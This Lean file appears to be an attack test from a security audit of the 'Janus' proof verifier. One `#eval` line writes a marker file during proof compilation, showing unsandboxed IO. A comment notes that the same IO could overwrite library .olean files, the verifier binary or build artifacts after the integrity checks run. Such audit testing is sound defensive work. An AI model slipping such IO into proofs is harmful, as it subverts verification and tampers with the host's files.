import Extracted
/-! ATTACK A6: `#eval` runs arbitrary IO while `janus verify` compiles the proof, with the
verifier's user privileges and no sandbox. Benign PoC: writes a marker file outside
`.janus-build` (next to the artifact directory). @MARKER@ is replaced by audit/run-all.sh with an absolute path of an EXISTING host
directory (the work dir), so the only thing that can stop the write is the sandbox hiding it (hermetic empty root: ENOENT). The same IO could rewrite the Janus library's
.olean files, `bin/janus`, or race-modify `.janus-build/Audit.lean` / `Extracted.olean` after the
integrity checks run. -/
#eval IO.FS.writeFile "@MARKER@" "proof code ran with write access\n"
open Janus Janus.Arm64 Janus.GoABI Janus.Tactic
namespace Proof
theorem correctness (x y : BitVec 64) :
    Ensures Extracted.program Extracted.entry [x, y] (fun _ => True)
      (fun _ s' => (s'.regs 0).toNat = (x.toNat + y.toNat) % 2 ^ 64) := by
  intro ret hret s hs _
  janus_intro hs
  janus_run
end Proof
